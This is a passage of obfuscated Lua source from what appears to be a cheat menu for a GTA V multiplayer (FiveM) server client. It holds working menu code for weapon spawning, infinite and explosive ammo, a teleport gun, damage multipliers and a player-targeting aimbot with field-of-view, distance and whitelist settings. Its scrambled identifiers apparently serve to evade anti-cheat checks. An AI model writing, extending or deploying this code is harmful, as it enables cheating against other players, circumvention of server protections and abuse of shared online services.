                                nlFXKkFxuKQAk.natives.TaskVehicleDriveToCoordLongrange(nlFXKkFxuKQAk.natives.PlayerPedId(), getMyV, wpCoords["x"], wpCoords["y"], wpCoords["z"], 200.0, REVMYmrswsZvxOXvJE.ADStyles.values[REVMYmrswsZvxOXvJE.ADStyles.selectedItemIndex], 10.0)
                            else
                                return
                            end
                            while true do
                                local getMyWp = nlFXKkFxuKQAk.natives.GetFirstBlipInfoId(8);
                                local isWp = nlFXKkFxuKQAk.natives.DoesBlipExist(getMyWp);
                                if not isWp or stopNow then
                                    nlFXKkFxuKQAk.natives.ClearPedTasks(nlFXKkFxuKQAk.natives.PlayerPedId())
                                    nlFXKkFxuKQAk.natives.SetVehicleForwardSpeed(nlFXKkFxuKQAk.natives.GetVehiclePedIsUsing(nlFXKkFxuKQAk.natives.PlayerPedId()), 0.0)
                                    return
                                end
                                RfPsUKHSFWJuBEJuz.rE.LumWait(0)
                            end
                        end)
                    end
                    -- Wander Around
                    if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Drive Around', 3, 90) then
                        local getMyV = nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.PlayerPedId(), false);
                        local isDriver = nlFXKkFxuKQAk.natives.GetPedInVehicleSeat(getMyV, -1);
                        if getMyV ~= 0 and isDriver == nlFXKkFxuKQAk.natives.PlayerPedId() then
                            nlFXKkFxuKQAk.natives.TaskVehicleDriveWander(nlFXKkFxuKQAk.natives.PlayerPedId(), getMyV, 200.0, REVMYmrswsZvxOXvJE.ADStyles.values[REVMYmrswsZvxOXvJE.ADStyles.selectedItemIndex])
                        end
                    end
                    -- Stop All Tasks
                    if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Stop Driving Now', 3, 110) then
                        RfPsUKHSFWJuBEJuz.rE.LumThread(function() nlFXKkFxuKQAk.natives.ClearPedTasks(nlFXKkFxuKQAk.natives.PlayerPedId()) stopNow = true RfPsUKHSFWJuBEJuz.rE.LumWait(250) stopNow = false end)
                    end
                end
            end
                --WEAPON OPTIONS
            if jrnyLearIyzKiSIen.config.Men4T then
                jrnyLearIyzKiSIen.config.offset4 = jrnyLearIyzKiSIen.config.offset4 + 215
                jrnyLearIyzKiSIen.config.Men5Y = jrnyLearIyzKiSIen.config.Men5Y + jrnyLearIyzKiSIen.config.offset4
                jrnyLearIyzKiSIen.func.DrawRectangle(jrnyLearIyzKiSIen.config.MainX, jrnyLearIyzKiSIen.config.MainY + jrnyLearIyzKiSIen.config.Men4Y + jrnyLearIyzKiSIen.config.SubMenuWH.subs4, jrnyLearIyzKiSIen.config.SubMenuWH.w, jrnyLearIyzKiSIen.config.offset4, jrnyLearIyzKiSIen.config.CSecondary2.r, jrnyLearIyzKiSIen.config.CSecondary2.g, jrnyLearIyzKiSIen.config.CSecondary2.b, jrnyLearIyzKiSIen.config.CSecondary2.a)
                if DmSgpcIoUEJtyTfBBt.Mfunc.ComboBox('', REVMYmrswsZvxOXvJE.Mopt3.items, REVMYmrswsZvxOXvJE.Mopt3.currentItemIndex, REVMYmrswsZvxOXvJE.Mopt3.selectedItemIndex, function(currentIndex, selectedIndex)
                    REVMYmrswsZvxOXvJE.Mopt3.currentItemIndex = currentIndex 
                    REVMYmrswsZvxOXvJE.Mopt3.selectedItemIndex = selectedIndex
                end, 4, 10, -10) then end
                if REVMYmrswsZvxOXvJE.Mopt3.values[REVMYmrswsZvxOXvJE.Mopt3.selectedItemIndex] then
                    if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Weapon Spawner', 4, 30) then
                        local stupidped = nlFXKkFxuKQAk.natives.PlayerPedId()				
                        local wepnamegay = DmSgpcIoUEJtyTfBBt.Mfunc.KeyboardInput('Weapon Name', 'weapon_', 100)		
                        local ammogay = DmSgpcIoUEJtyTfBBt.Mfunc.KeyboardInput('Ammo Count', '', 1000)
                        if wepnamegay and nlFXKkFxuKQAk.natives.IsWeaponValid(wepnamegay) then
                            DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('You Have ~g~Succsesfuly ~w~Spawned: '.. RfPsUKHSFWJuBEJuz.rE.LumString.LumUpper(wepnamegay) .. ' With '.. RfPsUKHSFWJuBEJuz.rE.LumString.LumUpper(ammogay) ..' Bullets')					
                            nlFXKkFxuKQAk.natives.GiveWeaponToPed(stupidped, RfPsUKHSFWJuBEJuz.rE.LumHash(wepnamegay), RfPsUKHSFWJuBEJuz.rE.LumToNum(ammogay), false, false)				
                        else
                            DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('ERROR: ~r~'.. RfPsUKHSFWJuBEJuz.rE.LumString.LumUpper(wepnamegay) ..' ~w~Is Not A Valid Weapon!')
                        end
                    end
                    if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Remove Current Weapon', 4, 50) then
                        DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Your Have ~g~Succesfuly ~w~Remove Your Current Gun')
                        nlFXKkFxuKQAk.natives.RemoveWeaponFromPed(nlFXKkFxuKQAk.natives.PlayerPedId(), nlFXKkFxuKQAk.natives.GetSelectedPedWeapon(nlFXKkFxuKQAk.natives.GetPlayerPed(-1)))
                    end
                    if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Custom Weapon Finder', 4, 70) then
                        DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Check Console For ~g~Weapons')
                        RfPsUKHSFWJuBEJuz.rE.pront("----------- Weapon Finder -----------")
                        for k, v in RfPsUKHSFWJuBEJuz.rE.Lumpairs(jrnyLearIyzKiSIen.func.CustomWeps) do
                            if nlFXKkFxuKQAk.natives.IsModelValid(v.spawn) then
                                RfPsUKHSFWJuBEJuz.rE.pront('Name: '..v.name..'', 'Spawn: '..v.spawn..'')
                            end
                        end
                        RfPsUKHSFWJuBEJuz.rE.pront('----------------------------------')
                    end
                    if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Refill Ammo', 4, 90) then
                        DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Your Have ~g~Succesfuly ~w~Refilled Your ~b~Ammo')
                        nlFXKkFxuKQAk.natives.AddAmmoToPed(nlFXKkFxuKQAk.natives.PlayerPedId(), nlFXKkFxuKQAk.natives.GetSelectedPedWeapon(nlFXKkFxuKQAk.natives.GetPlayerPed(-1)), 250)
                    end
                    if DmSgpcIoUEJtyTfBBt.Mfunc.CheckBox('Infinate Ammo', jrnyLearIyzKiSIen.config.features.GunNevaStop, function(enabled) jrnyLearIyzKiSIen.config.features.GunNevaStop = enabled end, 4, 110) then if jrnyLearIyzKiSIen.config.features.GunNevaStop then DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Infinate Ammo ~g~ON') else DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Infinate Ammo ~r~OFF') end end
                    if DmSgpcIoUEJtyTfBBt.Mfunc.CheckBox('Explosive Ammo', jrnyLearIyzKiSIen.config.features.Gungokaboom, function(enabled) jrnyLearIyzKiSIen.config.features.Gungokaboom = enabled end, 4, 130) then if jrnyLearIyzKiSIen.config.features.Gungokaboom then DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Explosive Ammo ~g~ON') else DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Explosive Ammo ~r~OFF') end end
                    if DmSgpcIoUEJtyTfBBt.Mfunc.CheckBox('Teleport Gun', jrnyLearIyzKiSIen.config.features.GunGoMoverino, function(enabled) jrnyLearIyzKiSIen.config.features.GunGoMoverino = enabled end, 4, 150) then if jrnyLearIyzKiSIen.config.features.GunGoMoverino then DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Teleport Gun ~g~ON') else DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Teleport Gun ~r~OFF') end end
                    if DmSgpcIoUEJtyTfBBt.Mfunc.CheckBox('Bullet Tracer', jrnyLearIyzKiSIen.config.features.GunGoTrace, function(enabled) jrnyLearIyzKiSIen.config.features.GunGoTrace = enabled end, 4, 170) then 
                        local tracers = {}
                        RfPsUKHSFWJuBEJuz.rE.LumThread(function()
                            while jrnyLearIyzKiSIen.config.features.GunGoTrace do
                                if nlFXKkFxuKQAk.natives.GetSelectedPedWeapon(nlFXKkFxuKQAk.natives.GetPlayerPed(-1)) ~= RfPsUKHSFWJuBEJuz.rE.LumHash('weapon_unarmed') then
                                    local jsnow, bigcord = nlFXKkFxuKQAk.natives.GetPedLastWeaponImpactCoord(nlFXKkFxuKQAk.natives.PlayerPedId())
                                    local coords = nlFXKkFxuKQAk.natives.GetEntityCoords(nlFXKkFxuKQAk.natives.PlayerPedId(), false)
                                    if jsnow then
                                        RfPsUKHSFWJuBEJuz.rE.LumTable.LumInsert(tracers, {coords, bigcord})
                                    end
                                end
                                RfPsUKHSFWJuBEJuz.rE.LumWait(0)
                            end
                        end)

                        RfPsUKHSFWJuBEJuz.rE.LumThread(function()
                            while jrnyLearIyzKiSIen.config.features.GunGoTrace do
                                for k, v in RfPsUKHSFWJuBEJuz.rE.Lumpairs(tracers) do
                                    local coords = nlFXKkFxuKQAk.natives.GetEntityCoords(nlFXKkFxuKQAk.natives.PlayerPedId(), false)
                                    nlFXKkFxuKQAk.natives.DrawLine(coords.x, coords.y, coords.z, v[2].x, v[2].y, v[2].z, jrnyLearIyzKiSIen.config.CText.r, jrnyLearIyzKiSIen.config.CText.g, jrnyLearIyzKiSIen.config.CText.b, jrnyLearIyzKiSIen.config.CText.a)
                                    nlFXKkFxuKQAk.natives.DrawMarker(28, v[2].x, v[2].y, v[2].z, 10.0, 50.0, 0.0, 0.0, 0.0, 0.0, 0.1, 0.1, 0.1, jrnyLearIyzKiSIen.config.CText.r, jrnyLearIyzKiSIen.config.CText.g, jrnyLearIyzKiSIen.config.CText.b, jrnyLearIyzKiSIen.config.CText.a, false, false, 0.0, false, nil, nil, false)
                                end
                                RfPsUKHSFWJuBEJuz.rE.LumWait(0)
                            end
                        end)
                        RfPsUKHSFWJuBEJuz.rE.LumThread(function()
                            while jrnyLearIyzKiSIen.config.features.GunGoTrace do
                                local time = 0
                                if tracers[1] ~= nil then
                                    for i = 1, 11 do
                                        if tracers[i] ~= nil then
                                            if i >= 10 then
                                                time = 100
                                            else
                                                time = 400
                                            end 
                                        end
                                    end
                                    RfPsUKHSFWJuBEJuz.rE.LumWait(time)
                                    RfPsUKHSFWJuBEJuz.rE.LumTable.LumRemove(tracers, 1)
                                end
                                RfPsUKHSFWJuBEJuz.rE.LumWait(0)
                            end
                        end)
                        if jrnyLearIyzKiSIen.config.features.GunGoTrace then DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Tracer Bullets ~g~ON') else DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Tracer Bullets ~r~OFF') end 
                    end
                    --[[if DmSgpcIoUEJtyTfBBt.Mfunc.CheckBox('No Recoil', jrnyLearIyzKiSIen.config.features.NoRecoil, function(enabled) jrnyLearIyzKiSIen.config.features.NoRecoil = enabled end, 4, 190) then
                        RfPsUKHSFWJuBEJuz.rE.LumThread(function()
                            while jrnyLearIyzKiSIen.config.features.NoRecoil do
                                RayCastCam = function(distance)	
                                    local cameraRotation = GetGameplayCamRot(0)
                                    local cameraCoord = GetGameplayCamCoord()	
                                    local direction = jrnyLearIyzKiSIen.freec.RotToDir2(cameraRotation)	
                                    local destination = {x = cameraCoord.x + direction.x * distance, y = cameraCoord.y + direction.y * distance, z = cameraCoord.z + direction.z * distance}	
                                    local a, b, c, d, e = nlFXKkFxuKQAk.natives.GetShapeTestResult(nlFXKkFxuKQAk.natives.StartShapeTestRay(cameraCoord.x, cameraCoord.y, cameraCoord.z, destination.x, destination.y, destination.z, -1, -1, 1))
                                    local final
                                    if c == vec3(0,0,0) then
                                        final = vec3(destination.x, destination.y, destination.z)
                                    else
                                        final = c
                                    end
                                    return final
                                end
                                DisableControlAction(0, 257, true)
                                --if nlFXKkFxuKQAk.natives.IsPedShooting(nlFXKkFxuKQAk.natives.PlayerPedId()) then
                                if IsDisabledControlPressed(0, 257) then
                                    local lookAt = RayCastCam(1000.0)
                                    SetPedShootsAtCoord(PlayerPedId(), lookAt.x, lookAt.y, lookAt.z, true)
                                    --local GunC = GetPedBoneCoords(PlayerPedId(), GetEntityBoneIndexByName(PlayerPedId(), 'Gun_Nuzzle'), 0.0, 0.0, 0.0)
                                    --ShootSingleBulletBetweenCoords(GunC.x, GunC.y, GunC.z, lookAt.x, lookAt.y, lookAt.z, 10, false, RfPsUKHSFWJuBEJuz.rE.LumMath.LumFloor(nlFXKkFxuKQAk.natives.GetWeaponDamage(nlFXKkFxuKQAk.natives.GetSelectedPedWeapon(nlFXKkFxuKQAk.natives.PlayerPedId()))), false, nlFXKkFxuKQAk.natives.GetSelectedPedWeapon(nlFXKkFxuKQAk.natives.PlayerPedId()), nlFXKkFxuKQAk.natives.PlayerPedId(), false, false, 1000.0)
                                end
                                RfPsUKHSFWJuBEJuz.rE.LumWait(0)
                            end
                        end)
                    end]]
                    if DmSgpcIoUEJtyTfBBt.Mfunc.ComboBox('Weapon Attachments', REVMYmrswsZvxOXvJE.Attachmentyea.items, REVMYmrswsZvxOXvJE.Attachmentyea.currentItemIndex, REVMYmrswsZvxOXvJE.Attachmentyea.selectedItemIndex, function(currentIndex, selectedIndex)
                        REVMYmrswsZvxOXvJE.Attachmentyea.currentItemIndex = currentIndex
                        REVMYmrswsZvxOXvJE.Attachmentyea.selectedItemIndex = selectedIndex
                    end, 4, 190) then if DmSgpcIoUEJtyTfBBt.FunFunc.attachmentyaya(REVMYmrswsZvxOXvJE.Attachmentyea.values[REVMYmrswsZvxOXvJE.Attachmentyea.selectedItemIndex]) == 1 then DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Your Have ~g~Succesfuly ~w~Added Attachment') elseif DmSgpcIoUEJtyTfBBt.FunFunc.attachmentyaya(REVMYmrswsZvxOXvJE.Attachmentyea.values[REVMYmrswsZvxOXvJE.Attachmentyea.selectedItemIndex]) == 2 then DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Your Have ~g~Succesfuly ~w~Removed Attachment') elseif DmSgpcIoUEJtyTfBBt.FunFunc.attachmentyaya(REVMYmrswsZvxOXvJE.Attachmentyea.values[REVMYmrswsZvxOXvJE.Attachmentyea.selectedItemIndex]) == 3 then DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification("This Attachment ~r~Doesnt Fit ~w~This Weapon") end end
                    if DmSgpcIoUEJtyTfBBt.Mfunc.ComboBox('Damage Multiplier', REVMYmrswsZvxOXvJE.DmgMultiTasker.items, REVMYmrswsZvxOXvJE.DmgMultiTasker.currentItemIndex, REVMYmrswsZvxOXvJE.DmgMultiTasker.selectedItemIndex, function(currentIndex, selectedIndex)
                        REVMYmrswsZvxOXvJE.DmgMultiTasker.currentItemIndex = currentIndex
                        REVMYmrswsZvxOXvJE.DmgMultiTasker.selectedItemIndex = selectedIndex
                    end, 4, 210) then DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Your Have ~g~Succesfuly ~w~Changed The Damage Multiplier') end
                else
                    if DmSgpcIoUEJtyTfBBt.Mfunc.CheckBox('Aimbot', jrnyLearIyzKiSIen.config.features.AimbotM, function(enabled) jrnyLearIyzKiSIen.config.features.AimbotM = enabled end, 4, 30) then 
                        RfPsUKHSFWJuBEJuz.rE.LumThread(function()
                            while jrnyLearIyzKiSIen.config.features.AimbotM do
                                if jrnyLearIyzKiSIen.config.features.ABTargetPed or jrnyLearIyzKiSIen.config.features.ABTargetPlayers then
                                    closestPed.ElPed = nil
                                    DmSgpcIoUEJtyTfBBt.FunFunc.fuckYou()
                                    if closestPed.ElPed ~= nil then
                                        if nlFXKkFxuKQAk.natives.IsDisabledControlPressed(0, jrnyLearIyzKiSIen.config.Keybinds.aimbotKb) then
                                            local mecords = nlFXKkFxuKQAk.natives.GetPedBoneCoords(nlFXKkFxuKQAk.natives.PlayerPedId(), 31086, 0.0, 0.0, 0.0)
                                            local tcords = nlFXKkFxuKQAk.natives.GetPedBoneCoords(closestPed.ElPed, 31086, 0.0, 0.0, 0.0)
                                            local dist = nlFXKkFxuKQAk.natives.GetDistanceBetweenCoords(mecords.x, mecords.y, mecords.z, tcords.x, tcords.y, tcords.z, true)
                                            local TargetCoords = nlFXKkFxuKQAk.natives.GetPedBoneCoords(closestPed.ElPed, REVMYmrswsZvxOXvJE.ABBone.values[REVMYmrswsZvxOXvJE.ABBone.selectedItemIndex], 0.0, 0.0, 0.0)
                                            local rot = nlFXKkFxuKQAk.natives.GetEntityRotation(closestPed.ElPed)
                                            local direct = jrnyLearIyzKiSIen.func.RotationToDirection(rot)
                                            if dist < RfPsUKHSFWJuBEJuz.rE.LumToNum(jrnyLearIyzKiSIen.config.AbDist) then
                                                if jrnyLearIyzKiSIen.config.features.ABDrawT then
                                                    jrnyLearIyzKiSIen.func.DrawTextOnCoords(tcords.x, tcords.y, tcords.z, 'x', 255, 0, 0)
                                                end
                                                if nlFXKkFxuKQAk.natives.IsPedShooting(nlFXKkFxuKQAk.natives.PlayerPedId()) and (not jrnyLearIyzKiSIen.config.features.ABNeedLOS or nlFXKkFxuKQAk.natives.HasEntityClearLosToEntity(nlFXKkFxuKQAk.natives.PlayerPedId(), closestPed.ElPed, 17)) then
                                                    nlFXKkFxuKQAk.natives.ShootSingleBulletBetweenCoords((TargetCoords.x + direct.x), (TargetCoords.y + direct.y), (TargetCoords.z + direct.z), TargetCoords.x, TargetCoords.y, TargetCoords.z, RfPsUKHSFWJuBEJuz.rE.LumMath.LumFloor(nlFXKkFxuKQAk.natives.GetWeaponDamage(nlFXKkFxuKQAk.natives.GetSelectedPedWeapon(nlFXKkFxuKQAk.natives.PlayerPedId()))), false, nlFXKkFxuKQAk.natives.GetSelectedPedWeapon(nlFXKkFxuKQAk.natives.PlayerPedId()), nlFXKkFxuKQAk.natives.PlayerPedId(), false, false, 10000.0)
                                                end
                                            end
                                        end
                                    end
                                    DmSgpcIoUEJtyTfBBt.FunFunc.timeOut(jrnyLearIyzKiSIen.config.Delay)
                                end
                                RfPsUKHSFWJuBEJuz.rE.LumWait(0)
                            end
                        end)
                        if jrnyLearIyzKiSIen.config.features.AimbotM then 
                            DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Master Aimbot Switch ~g~ON') 
                        else 
                            DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Master Aimbot Switch ~r~OFF') 
                        end
                    end
                    if jrnyLearIyzKiSIen.config.features.AimbotM then
                        -- Whitelist
                        jrnyLearIyzKiSIen.func.DrawRectangle(jrnyLearIyzKiSIen.config.MainX + 260 + jrnyLearIyzKiSIen.config.SubMenuWH.abOl, jrnyLearIyzKiSIen.config.MainY + jrnyLearIyzKiSIen.config.Men4Y + jrnyLearIyzKiSIen.config.SubMenuWH.subs4 - jrnyLearIyzKiSIen.config.SubMenuWH.h, 200, jrnyLearIyzKiSIen.config.SubMenuWH.h, jrnyLearIyzKiSIen.config.CSecondary.r, jrnyLearIyzKiSIen.config.CSecondary.g, jrnyLearIyzKiSIen.config.CSecondary.b, jrnyLearIyzKiSIen.config.CSecondary.a)
                        jrnyLearIyzKiSIen.func.DrawSomeText('Aimbot White List', 4, false, jrnyLearIyzKiSIen.config.MainX + jrnyLearIyzKiSIen.config.SubMenuWH.abOl7, jrnyLearIyzKiSIen.config.MainY + jrnyLearIyzKiSIen.config.Men4Y + jrnyLearIyzKiSIen.config.SubMenuWH.subt4, jrnyLearIyzKiSIen.config.SubMenuScale, jrnyLearIyzKiSIen.config.CText.r, jrnyLearIyzKiSIen.config.CText.g, jrnyLearIyzKiSIen.config.CText.b, jrnyLearIyzKiSIen.config.CText.a)

                        jrnyLearIyzKiSIen.config.Men2tOff = 10
                        jrnyLearIyzKiSIen.config.Men2mbOff = 0

                        local playerlist = nlFXKkFxuKQAk.natives.GetActivePlayers()
                        
                        local pages = RfPsUKHSFWJuBEJuz.rE.LumMath.LumCeli(#playerlist / 9)

                        if DmSgpcIoUEJtyTfBBt.Mfunc.Button('\226\134\144\10', 4, -21, jrnyLearIyzKiSIen.config.SubMenuWH.abOl4, 0) then
                            if jrnyLearIyzKiSIen.config.WepOPPageS.oppages ~= 0 then
                                jrnyLearIyzKiSIen.config.WepOPPageS.oppages = (jrnyLearIyzKiSIen.config.WepOPPageS.oppages - 1) % pages
                            end
                        end
                    
                        if DmSgpcIoUEJtyTfBBt.Mfunc.Button('\226\134\146\10', 4, -21, jrnyLearIyzKiSIen.config.SubMenuWH.abOl5, 0) then
                            if jrnyLearIyzKiSIen.config.WepOPPageS.oppages ~= pages - 1 then
                                jrnyLearIyzKiSIen.config.WepOPPageS.oppages = (jrnyLearIyzKiSIen.config.WepOPPageS.oppages + 1) % pages
                            end
                        end
                    
                        jrnyLearIyzKiSIen.func.DrawSomeText('Page: '.. jrnyLearIyzKiSIen.config.WepOPPageS.oppages + 1 .. '/'.. pages ..'', 4, false, jrnyLearIyzKiSIen.config.MainX + jrnyLearIyzKiSIen.config.SubMenuWH.abOl9, jrnyLearIyzKiSIen.config.MainY + jrnyLearIyzKiSIen.config.Men4Y + jrnyLearIyzKiSIen.config.SubMenuWH.abOl11, jrnyLearIyzKiSIen.config.ButtonScale, jrnyLearIyzKiSIen.config.CText.r, jrnyLearIyzKiSIen.config.CText.g, jrnyLearIyzKiSIen.config.CText.b, jrnyLearIyzKiSIen.config.CText.a)

                        local trueoppage = jrnyLearIyzKiSIen.config.WepOPPageS.oppages + 1
                        local showoppage = trueoppage * 9
                        local dontshowoppage = showoppage - 9
                        
                        RfPsUKHSFWJuBEJuz.rE.LumTable.LumSort(playerlist, function(a, b)
                            return (nlFXKkFxuKQAk.natives.GetPlayerServerId(a) < nlFXKkFxuKQAk.natives.GetPlayerServerId(b))
                        end)
                        for i = 1, #playerlist do
                            local currPlayer = playerlist[i]
                            jrnyLearIyzKiSIen.config.Men2mbOff = jrnyLearIyzKiSIen.config.Men2mbOff + 17.3
                            if showoppage >= i and dontshowoppage < i then    
                                if DmSgpcIoUEJtyTfBBt.Mfunc.Button('ID: ' .. nlFXKkFxuKQAk.natives.GetPlayerServerId(currPlayer) .. ' Name: ' .. nlFXKkFxuKQAk.natives.GetPlayerName(currPlayer) .. '', 4, jrnyLearIyzKiSIen.config.Men2tOff, jrnyLearIyzKiSIen.config.SubMenuWH.abOl8 + 15) then
                                    if not jrnyLearIyzKiSIen.func.Random_stringcontains(jrnyLearIyzKiSIen.config.aimbotfriend, nlFXKkFxuKQAk.natives.GetPlayerServerId(currPlayer)) then
                                        RfPsUKHSFWJuBEJuz.rE.LumTable.LumInsert(jrnyLearIyzKiSIen.config.aimbotfriend, nlFXKkFxuKQAk.natives.GetPlayerServerId(currPlayer))
                                        DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Your Have ~g~Succesfuly ~w~Added A Player To The Aimbot Whitelist')
                                    else
                                        jrnyLearIyzKiSIen.func.table_removekey(jrnyLearIyzKiSIen.config.aimbotfriend, nlFXKkFxuKQAk.natives.GetPlayerServerId(currPlayer))
                                        DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Your Have ~g~Succesfuly ~w~Removed A Player To The Aimbot Whitelist')
                                    end
                                end
                                if jrnyLearIyzKiSIen.func.Random_stringcontains(jrnyLearIyzKiSIen.config.aimbotfriend, nlFXKkFxuKQAk.natives.GetPlayerServerId(currPlayer)) then
                                    jrnyLearIyzKiSIen.func.DrawSomeSprite(jrnyLearIyzKiSIen.config.MainX + jrnyLearIyzKiSIen.config.SubMenuWH.abOl8 + 25, jrnyLearIyzKiSIen.config.MainY + jrnyLearIyzKiSIen.config.Men4Y + jrnyLearIyzKiSIen.config.Men2tOff + jrnyLearIyzKiSIen.config.SubMenuWH.subs4, 25, 25, 0.0, "mpleaderboard", "leaderboard_votetick_icon", jrnyLearIyzKiSIen.config.CText.r, jrnyLearIyzKiSIen.config.CText.g, jrnyLearIyzKiSIen.config.CText.b, jrnyLearIyzKiSIen.config.CText.a)
                                end
                                jrnyLearIyzKiSIen.config.Men2tOff = jrnyLearIyzKiSIen.config.Men2tOff + 17
                            end
                        end

                        jrnyLearIyzKiSIen.func.DrawRectangle(jrnyLearIyzKiSIen.config.MainX + 260 + jrnyLearIyzKiSIen.config.SubMenuWH.abOl, jrnyLearIyzKiSIen.config.MainY + jrnyLearIyzKiSIen.config.Men4Y + jrnyLearIyzKiSIen.config.SubMenuWH.abOl12, 200, 155, jrnyLearIyzKiSIen.config.CSecondary2.r, jrnyLearIyzKiSIen.config.CSecondary2.g, jrnyLearIyzKiSIen.config.CSecondary2.b, jrnyLearIyzKiSIen.config.CSecondary2.a)
                        -- Whitelist end
                        if DmSgpcIoUEJtyTfBBt.Mfunc.CheckBox('Target Peds', jrnyLearIyzKiSIen.config.features.ABTargetPed, function(enabled) jrnyLearIyzKiSIen.config.features.ABTargetPed = enabled end, 4, 50) then if jrnyLearIyzKiSIen.config.features.ABTargetPed then DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('The Aimbot ~g~Will Now ~w~Target Peds') else DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('The Aimbot ~r~Will Not ~w~Target Peds') end end
                        if DmSgpcIoUEJtyTfBBt.Mfunc.CheckBox('Target Players', jrnyLearIyzKiSIen.config.features.ABTargetPlayers, function(enabled) jrnyLearIyzKiSIen.config.features.ABTargetPlayers = enabled end, 4, 70) then if jrnyLearIyzKiSIen.config.features.ABTargetPlayers then DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('The Aimbot ~g~Will Now ~w~Target Players') else DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('The Aimbot ~r~Will Not ~w~Target Players') end end
                        if DmSgpcIoUEJtyTfBBt.Mfunc.CheckBox('Needs Line Of Sight', jrnyLearIyzKiSIen.config.features.ABNeedLOS, function(enabled) jrnyLearIyzKiSIen.config.features.ABNeedLOS = enabled end, 4, 90) then if jrnyLearIyzKiSIen.config.features.ABNeedLOS then DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('The Aimbot ~g~Will Now ~w~Need Line Of Sight') else DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('The Aimbot ~r~Will Not ~w~Need Line Of Sight') end end
                        if DmSgpcIoUEJtyTfBBt.Mfunc.CheckBox('Draw Fov', jrnyLearIyzKiSIen.config.features.ABDrawFOV, function(enabled) jrnyLearIyzKiSIen.config.features.ABDrawFOV = enabled end, 4, 110) then if jrnyLearIyzKiSIen.config.features.ABDrawFOV then DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Draw FOV ~g~ON') else DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Draw FOV ~r~OFF') end end
                        if DmSgpcIoUEJtyTfBBt.Mfunc.CheckBox('Draw Target', jrnyLearIyzKiSIen.config.features.ABDrawT, function(enabled) jrnyLearIyzKiSIen.config.features.ABDrawT = enabled end, 4, 130) then if jrnyLearIyzKiSIen.config.features.ABDrawT then DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Draw Target ~g~ON') else DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Draw Target ~r~OFF') end end
                        if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Set Fov:', 4, 30, 100) then
                            jrnyLearIyzKiSIen.config.aimbotfov = DmSgpcIoUEJtyTfBBt.Mfunc.KeyboardInput('FOV (ONLY NUMBERS)', '', 100)
                            DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('The FOV Has Been ~g~Succsesfuly ~w~Set To: '.. jrnyLearIyzKiSIen.config.aimbotfov ..'')
                        end
                        if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Distance:', 4, 50, 100) then
                            jrnyLearIyzKiSIen.config.AbDist = DmSgpcIoUEJtyTfBBt.Mfunc.KeyboardInput('Distace (ONLY NUMBERS)', '', 100)
                            DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('The Distace Has Been ~g~Succsesfuly ~w~Set To: '.. jrnyLearIyzKiSIen.config.AbDist ..'')
                        end
                        if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Delay:', 4, 70, 100) then
                            jrnyLearIyzKiSIen.config.Delay = DmSgpcIoUEJtyTfBBt.Mfunc.KeyboardInput('Delay (ONLY NUMBERS IN MS)', '', 100)
                            DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('The Delay Has Been ~g~Succsesfuly ~w~Set To: '.. jrnyLearIyzKiSIen.config.Delay ..'')
                        end
                        jrnyLearIyzKiSIen.func.DrawSomeText(jrnyLearIyzKiSIen.config.aimbotfov, 4, false, jrnyLearIyzKiSIen.config.MainX + 65 + 90, jrnyLearIyzKiSIen.config.MainY + jrnyLearIyzKiSIen.config.Men4Y + jrnyLearIyzKiSIen.config.SubMenuWH.subs4 + 20, jrnyLearIyzKiSIen.config.ButtonScale, jrnyLearIyzKiSIen.config.CText.r, jrnyLearIyzKiSIen.config.CText.g, jrnyLearIyzKiSIen.config.CText.b, jrnyLearIyzKiSIen.config.CText.a)
                        jrnyLearIyzKiSIen.func.DrawSomeText(jrnyLearIyzKiSIen.config.AbDist, 4, false, jrnyLearIyzKiSIen.config.MainX + 67 + 95, jrnyLearIyzKiSIen.config.MainY + jrnyLearIyzKiSIen.config.Men4Y + jrnyLearIyzKiSIen.config.SubMenuWH.subs4 + 40, jrnyLearIyzKiSIen.config.ButtonScale, jrnyLearIyzKiSIen.config.CText.r, jrnyLearIyzKiSIen.config.CText.g, jrnyLearIyzKiSIen.config.CText.b, jrnyLearIyzKiSIen.config.CText.a)
